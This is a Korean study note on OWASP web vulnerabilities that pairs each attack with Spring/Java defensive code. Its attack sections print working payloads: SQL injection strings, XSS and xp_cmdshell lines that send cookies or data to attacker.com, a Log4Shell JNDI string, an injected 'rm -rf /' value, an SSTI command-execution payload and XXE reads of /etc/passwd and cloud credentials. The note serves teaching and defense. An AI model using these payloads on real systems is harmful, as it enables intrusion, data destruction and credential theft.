---
tags:
  - security
  - attack
  - web
  - owasp
  - sql-injection
  - xss
  - rce
created: 2026-06-16
---

# 웹 공격 기법 및 방어

> [!summary] 한 줄 요약
> OWASP Top 10 기반 주요 웹 취약점. **SQL Injection**(DB 직접 조작), **XSS**(클라이언트 스크립트 삽입), **RCE**(서버 명령 실행)가 핵심 3대 위협. 공격 원리를 이해해야 방어가 가능하다.

---

## 1. SQL Injection

### 원리

```
정상 쿼리:
  SELECT * FROM users WHERE id = '1234' AND pw = 'secret'

공격자 입력 id: 1' OR '1'='1
생성 쿼리:
  SELECT * FROM users WHERE id = '1' OR '1'='1' AND pw = '...'
  → 항상 TRUE → 모든 사용자 레코드 반환
```

### 공격 유형

**① UNION-based SQLi** — 결과를 직접 읽을 수 있을 때

```sql
-- 컬럼 수 탐색
' ORDER BY 1--   ' ORDER BY 2--  ...

-- DB 버전 추출
' UNION SELECT null, version(), null--

-- 테이블 목록 추출 (MySQL)
' UNION SELECT table_name, null FROM information_schema.tables--

-- 계정 덤프
' UNION SELECT username, password FROM users--
```

**② Error-based SQLi** — 오류 메시지에 데이터가 노출될 때

```sql
-- MySQL
' AND extractvalue(1, concat(0x7e, (SELECT version())))--
-- 오류: XPATH syntax error: '~8.0.35'
```

**③ Blind SQLi (Boolean-based)** — 결과가 보이지 않지만 TRUE/FALSE 구분 가능

```sql
-- 비밀번호 첫 글자 추측 (이진 탐색)
' AND substring(password,1,1) > 'm'--  → 응답 다름(TRUE/FALSE)
' AND substring(password,1,1) = 's'--  → TRUE면 's'가 첫 글자
```

**④ Time-based Blind SQLi** — 응답 지연으로 데이터 추론

```sql
-- MySQL: 조건이 TRUE면 5초 지연
' AND if(substring(password,1,1)='s', sleep(5), 0)--

-- PostgreSQL
'; SELECT CASE WHEN (substring(password,1,1)='s') THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- MSSQL
'; IF (substring(password,1,1)='s') WAITFOR DELAY '0:0:5'--
```

**⑤ Out-of-Band SQLi** — DNS/HTTP 외부 채널로 데이터 반출

```sql
-- MySQL (파일 I/O 권한 필요)
' UNION SELECT load_file('/etc/passwd') INTO OUTFILE '/var/www/html/dump.txt'--

-- MSSQL (xp_cmdshell)
'; EXEC xp_cmdshell 'nslookup $(whoami).attacker.com'--
```

**⑥ Second-Order SQLi** — 저장 후 다른 쿼리에서 실행

```
등록 시: username = admin'--   (저장은 됨)
비밀번호 변경 쿼리:
  UPDATE users SET pw='new' WHERE username='admin'--'
  → admin 계정 비밀번호 변경
```

### 방어

```java
// ✅ PreparedStatement (파라미터 바인딩) — 근본 해결
String sql = "SELECT * FROM users WHERE id = ? AND pw = ?";
PreparedStatement ps = conn.prepareStatement(sql);
ps.setString(1, userId);
ps.setString(2, password);

// ✅ JPA Named Query
@Query("SELECT u FROM User u WHERE u.id = :id")
User findById(@Param("id") String id);

// ❌ 절대 금지: 문자열 직접 연결
String sql = "SELECT * FROM users WHERE id = '" + userId + "'";  // 취약!
```

| 방어 계층 | 방법 |
|---|---|
| **쿼리** | PreparedStatement / Parameterized Query |
| **ORM** | JPA/Hibernate (자동 파라미터 바인딩) |
| **입력** | 화이트리스트 검증, 특수문자 이스케이프 |
| **권한** | DB 계정 최소권한 (SELECT만, DROP 금지) |
| **WAF** | 알려진 SQLi 패턴 차단 (우회 가능하므로 보조 수단) |
| **오류** | DB 에러 메시지를 사용자에게 노출 금지 |

---

## 2. XSS (Cross-Site Scripting)

### 원리

```
공격자가 악성 스크립트를 웹 페이지에 삽입 → 피해자 브라우저에서 실행
→ 세션 탈취, 키로거, 피싱 페이지, CSRF 발동
```

### 공격 유형

**① Stored XSS (저장형)** — 가장 위험

```html
<!-- 공격자가 게시판에 입력 -->
<script>
  document.location='https://attacker.com/steal?c='+document.cookie;
</script>

<!-- 또는 이미지 태그로 우회 -->
<img src="x" onerror="fetch('https://attacker.com/?c='+btoa(document.cookie))">

<!-- 저장된 내용을 다른 사용자가 조회 → 스크립트 실행 → 쿠키 탈취 -->
```

**② Reflected XSS (반사형)** — URL에 포함, 클릭 유도

```
피싱 URL:
https://victim.com/search?q=<script>document.location='https://attacker.com/?c='+document.cookie</script>

→ 서버가 q 값을 HTML에 그대로 출력하면 실행됨
→ 공격자가 URL 단축 후 피해자에게 전송
```

**③ DOM-based XSS** — 서버 관여 없이 JS로만 발생

```javascript
// 취약한 코드
const name = location.hash.slice(1);
document.getElementById('greeting').innerHTML = 'Hello, ' + name;

// URL: https://victim.com/#<img src=x onerror=alert(1)>
// 서버 응답에는 스크립트 없지만 브라우저 DOM 조작으로 실행
```

**④ mXSS (Mutation XSS)** — HTML 파서가 재파싱 시 변형

```html
<!-- 입력 후 무해해 보이지만 HTML 파서가 변환 시 실행 -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

### BeEF (Browser Exploitation Framework) — XSS 이후

```
XSS 성공 후 BeEF hook.js를 삽입하면:
  · 피해자 브라우저를 좀비로 제어
  · 키스트로크 캡처
  · 스크린샷
  · 내부망 포트 스캔
  · CSRF 공격 자동화
  · 웹캠/마이크 요청
```

### 방어

```java
// ✅ Thymeleaf — 자동 HTML 이스케이프
<span th:text="${userInput}">           <!-- & < > " ' → 엔티티 변환 -->
<span th:utext="${trustedHtml}">        <!-- 이스케이프 안 함, 신뢰 데이터만 -->

// ✅ Java — OWASP Java Encoder
String safe = Encode.forHtml(userInput);
String safeJs = Encode.forJavaScript(userInput);
String safeUrl = Encode.forUriComponent(userInput);
```

```http
# ✅ 필수 HTTP 헤더
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; object-src 'none'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
```

```javascript
// ✅ DOM XSS 방어 — innerHTML 대신 textContent
element.textContent = userInput;       // 안전 (이스케이프 자동)
element.innerHTML = userInput;         // ❌ 위험

// ✅ DOMPurify — HTML 입력이 필요한 경우
const clean = DOMPurify.sanitize(dirtyHtml, { ALLOWED_TAGS: ['b', 'i', 'em'] });
```

| 방어 계층 | 방법 |
|---|---|
| **출력** | HTML 이스케이프 (컨텍스트에 맞게: HTML/JS/CSS/URL) |
| **헤더** | CSP (Content-Security-Policy) 엄격 설정 |
| **쿠키** | HttpOnly (JS에서 쿠키 접근 차단), Secure, SameSite=Strict |
| **입력** | DOMPurify로 HTML 새니타이즈 |
| **DOM** | innerHTML 대신 textContent, setAttribute |

---

## 3. CSRF (Cross-Site Request Forgery)

### 원리

```
1. 피해자가 bank.com에 로그인 (세션 쿠키 있음)
2. 공격자 사이트 방문
3. 공격자 페이지에 숨겨진 폼:
   <form action="https://bank.com/transfer" method="POST">
     <input name="amount" value="1000000">
     <input name="to" value="attacker">
   </form>
   <script>document.forms[0].submit()</script>
4. 브라우저가 bank.com에 세션 쿠키와 함께 요청 전송
5. 서버는 정상 요청으로 처리 → 이체 완료
```

### 방어

```java
// Spring Security CSRF 토큰 (기본 활성화)
// POST/PUT/DELETE 요청에 _csrf 토큰 포함 필수

// Thymeleaf 자동 삽입
<form th:action="@{/transfer}" method="post">
  <input type="hidden" th:name="${_csrf.parameterName}" th:value="${_csrf.token}">
</form>

// SPA: X-CSRF-Token 헤더로 전송
axios.defaults.headers.common['X-CSRF-Token'] = csrfToken;
```

```http
# SameSite 쿠키 — CSRF 근본 방어 (최신 브라우저)
Set-Cookie: JSESSIONID=xxx; SameSite=Strict; HttpOnly; Secure
# Strict: 외부 사이트에서의 요청엔 쿠키 미전송
```

---

## 4. RCE (Remote Code Execution)

서버에서 공격자가 원하는 코드를 실행하는 최고 수준의 취약점.

### 4.1 Command Injection

```java
// ❌ 취약: 사용자 입력을 셸 명령에 직접 사용
String filename = request.getParameter("file");
Runtime.getRuntime().exec("convert " + filename + " output.png");

// 입력: "image.jpg; rm -rf /"
// 실행: convert image.jpg; rm -rf / output.png
```

```java
// ✅ 방어: 배열로 전달 (셸 해석 없음)
String[] cmd = {"convert", filename, "output.png"};
ProcessBuilder pb = new ProcessBuilder(cmd);
// 또는 화이트리스트로 파일명 검증
if (!filename.matches("[a-zA-Z0-9_\\-]+\\.(jpg|png|gif)")) {
    throw new IllegalArgumentException("Invalid filename");
}
```

### 4.2 Deserialization RCE

```
Java 직렬화(ObjectInputStream.readObject()) 취약점:
  · 신뢰할 수 없는 소스의 직렬화 데이터 역직렬화
  · 가젯 체인 (Gadget Chain): 클래스패스 내 클래스들을 조합해 임의 코드 실행
  · Apache Commons Collections, Spring, Log4j 등 가젯 체인 존재

Log4Shell (CVE-2021-44228):
  JNDI Lookup → ${jndi:ldap://attacker.com/exploit}
  Log4j가 LDAP 서버에 접속 → 악성 Java 클래스 다운로드·실행
```

```java
// ✅ 방어
// 1. 역직렬화 필터 적용 (Java 9+)
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "java.base/*;!*"  // java.base만 허용
);
ObjectInputStream ois = new ObjectInputStream(inputStream);
ois.setObjectInputFilter(filter);

// 2. 안전한 형식 사용 (JSON, Protocol Buffers)
// Java 직렬화 사용 최소화

// 3. Log4j: 최신 버전 사용, JNDI 비활성화
// log4j2.formatMsgNoLookups=true
```

### 4.3 SSTI (Server-Side Template Injection)

```
Thymeleaf/FreeMarker/Velocity에서 사용자 입력을 템플릿으로 처리 시

// ❌ 취약 (Spring + Thymeleaf)
@GetMapping("/hello")
public String hello(@RequestParam String name, Model model) {
    return "hello/" + name;  // name = "fragments/login :: loginForm"
}                            // → 다른 템플릿 파일 실행 가능

// FreeMarker SSTI 예시
${7*7}               → 49 (템플릿 실행 확인)
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}          → uid=0(root) ...
```

```java
// ✅ 방어
// 1. 사용자 입력을 경로에 직접 사용 금지
// 2. 화이트리스트 뷰 이름 검증
if (!ALLOWED_VIEWS.contains(viewName)) {
    return "error";
}
// 3. Sandbox 모드 활성화 (FreeMarker)
cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);
```

### 4.4 XXE (XML External Entity)

```xml
<!-- 악성 XML 입력 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>
<!-- → /etc/passwd 내용이 name 필드에 노출 -->

<!-- SSRF로 활용 -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/credentials">
<!-- → AWS 메타데이터 서버에서 임시 자격증명 탈취 -->
```

```java
// ✅ 방어: XXE 비활성화
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setExpandEntityReferences(false);
```

---

## 5. SSRF (Server-Side Request Forgery)

### 원리

```
서버가 외부 URL을 가져오는 기능을 악용:
  webhookUrl = http://169.254.169.254/latest/meta-data/  (AWS IMDSv1)
  → 서버가 내부 AWS 메타데이터 API에 접속
  → IAM 인증 토큰 탈취 → AWS 전체 권한

내부망 스캔:
  url = http://10.0.0.1:22, :3306, :5432, :6379
  → 내부 서비스 존재 여부 확인
  → Redis, DB, Kubernetes API에 접근
```

```java
// ✅ 방어
// 1. URL 화이트리스트
private static final Set<String> ALLOWED_HOSTS = Set.of("api.partner.com", "cdn.example.com");
URI uri = URI.create(url);
if (!ALLOWED_HOSTS.contains(uri.getHost())) {
    throw new SecurityException("Blocked host: " + uri.getHost());
}

// 2. 내부 IP 차단
InetAddress addr = InetAddress.getByName(uri.getHost());
if (addr.isSiteLocalAddress() || addr.isLoopbackAddress() || addr.isLinkLocalAddress()) {
    throw new SecurityException("Private IP blocked");
}

// 3. IMDSv2 전환 (AWS) — 토큰 헤더 필요, SSRF에서 접근 불가
```

---

## 6. Path Traversal (디렉토리 탐색)

```
정상: GET /download?file=report.pdf
공격: GET /download?file=../../etc/passwd
     GET /download?file=..%2F..%2Fetc%2Fpasswd   (URL 인코딩)
     GET /download?file=....//....//etc/passwd     (이중 슬래시)

→ 서버가 /var/www/files/../../etc/passwd = /etc/passwd 읽어 반환
```

```java
// ✅ 방어
Path baseDir = Paths.get("/var/www/files").toRealPath();
Path requestedPath = baseDir.resolve(filename).normalize().toRealPath();

if (!requestedPath.startsWith(baseDir)) {
    throw new SecurityException("Path traversal detected");
}
```

---

## 7. IDOR (Insecure Direct Object Reference)

```
정상: GET /api/orders/1234  (내 주문)
공격: GET /api/orders/1235  (다른 사람 주문 — 숫자만 바꿈)

취약 코드:
  @GetMapping("/orders/{id}")
  public Order getOrder(@PathVariable Long id) {
      return orderRepository.findById(id).orElseThrow();
      // ← 로그인한 사용자 소유 여부 미검증
  }
```

```java
// ✅ 방어: 소유권 검증
@GetMapping("/orders/{id}")
public Order getOrder(@PathVariable Long id, @AuthenticationPrincipal UserDetails user) {
    Order order = orderRepository.findById(id).orElseThrow();
    if (!order.getUserId().equals(user.getId())) {
        throw new AccessDeniedException("Not your order");
    }
    return order;
}
```

---

## 8. JWT 관련 공격

```
[Algorithm Confusion — alg:none]
  JWT 헤더: {"alg":"none","typ":"JWT"}
  → 서명 없이 payload 변조 후 제출
  → 취약 서버는 검증 없이 수락

[alg:RS256 → HS256 전환]
  RS256: 서버 공개키로 검증
  공격자가 alg를 HS256으로 바꾸고 서버의 공개키로 HMAC 서명
  → 일부 라이브러리가 공개키를 HMAC 비밀키로 오용

[JWT Secret 브루트포스]
  HS256 비밀키가 약하면 (password, secret 등)
  hashcat / jwt_tool로 수 초~분 내 크랙 가능
```

```java
// ✅ 방어
// 1. alg 검증 강제
JwtParserBuilder parser = Jwts.parserBuilder()
    .requireAlgorithm("RS256")  // alg:none, HS256 전환 차단
    .setSigningKey(publicKey);

// 2. 충분한 비밀키 길이 (HS256: 256비트 이상 랜덤)
// 3. RS256/ES256 (비대칭) 선호 — 비밀키 공유 불필요
```

---

## 9. 방어 체계 요약 (Defense in Depth)

```
[입력 검증]    화이트리스트, 타입 검증, 길이 제한
      ↓
[처리]         PreparedStatement, 파라미터 바인딩, 이스케이프
      ↓
[출력]         HTML/JS/CSS/URL 컨텍스트별 이스케이프
      ↓
[헤더]         CSP, X-Frame-Options, HSTS, X-Content-Type-Options
      ↓
[인증/인가]    JWT 검증, CSRF 토큰, IDOR 소유권 확인
      ↓
[WAF]          알려진 패턴 차단 (보조 수단)
      ↓
[로깅/모니터링] 이상 요청 탐지, SIEM 연동
```

---

## 10. Spring Security — 방어 코드 패턴

```java
// Spring Security 설정 — CSRF / CORS / CSP / 메서드 보안
@Configuration
@EnableWebSecurity
@EnableMethodSecurity                          // @PreAuthorize 활성화
public class SecurityConfig {

    @Bean
    SecurityFilterChain web(HttpSecurity http) throws Exception {
        http
            // CSRF: Stateful 웹앱은 활성화, REST API(JWT)는 비활성화
            .csrf(csrf -> csrf
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse()))

            // CORS
            .cors(cors -> cors.configurationSource(corsConfig()))

            // 보안 헤더
            .headers(h -> h
                .contentSecurityPolicy(csp -> csp
                    .policyDirectives(
                        "default-src 'self'; " +
                        "script-src 'self'; " +
                        "object-src 'none'; " +
                        "frame-ancestors 'none'"))
                .httpStrictTransportSecurity(hsts -> hsts
                    .includeSubDomains(true).maxAgeInSeconds(31536000))
                .frameOptions(fo -> fo.deny())
                .contentTypeOptions(Customizer.withDefaults()))

            // 인가
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/public/**", "/actuator/health").permitAll()
                .requestMatchers("/admin/**").hasRole("ADMIN")
                .anyRequest().authenticated())

            // JWT 리소스 서버
            .oauth2ResourceServer(o -> o.jwt(Customizer.withDefaults()))

            // 세션리스
            .sessionManagement(s -> s
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS));

        return http.build();
    }

    @Bean
    CorsConfigurationSource corsConfig() {
        var config = new CorsConfiguration();
        config.setAllowedOrigins(List.of("https://app.example.com"));  // 와일드카드 금지
        config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE"));
        config.setAllowedHeaders(List.of("Authorization", "Content-Type"));
        config.setAllowCredentials(true);
        var source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/**", config);
        return source;
    }
}
```

```java
// 메서드 수준 인가 — @PreAuthorize
@RestController
public class OrderController {

    @GetMapping("/orders/{id}")
    @PreAuthorize("hasRole('USER') and @orderSecurity.isOwner(#id, authentication)")
    public OrderResponse getOrder(@PathVariable Long id) { ... }

    @DeleteMapping("/orders/{id}")
    @PreAuthorize("hasRole('ADMIN')")
    public void deleteOrder(@PathVariable Long id) { ... }
}

// 커스텀 보안 표현식
@Component("orderSecurity")
public class OrderSecurityExpression {
    public boolean isOwner(Long orderId, Authentication auth) {
        var userId = ((UserDetails) auth.getPrincipal()).getUsername();
        return orderRepository.existsByIdAndUserId(orderId, userId);
    }
}
```

```java
// 입력 검증 (Bean Validation + 커스텀)
@PostMapping("/orders")
public ResponseEntity<OrderResponse> create(
        @Valid @RequestBody OrderRequest req) { ... }

public record OrderRequest(
    @NotBlank @Size(max = 100)
    @Pattern(regexp = "^[a-zA-Z0-9-]+$")   // 허용 문자 화이트리스트
    String itemId,

    @Min(1) @Max(1000)
    Integer quantity
) {}
```

---

## 11. 관련
- [[Cryptography]] · [[Network-Attacks]] · [[Supply-Chain-Security]]
- [[../spring/security/Spring-Security]] · [[../spring/security/OAuth2-JWT]]
- [[../../infra/security/Cloud-Security-Products]] — WAF/SIEM 연동
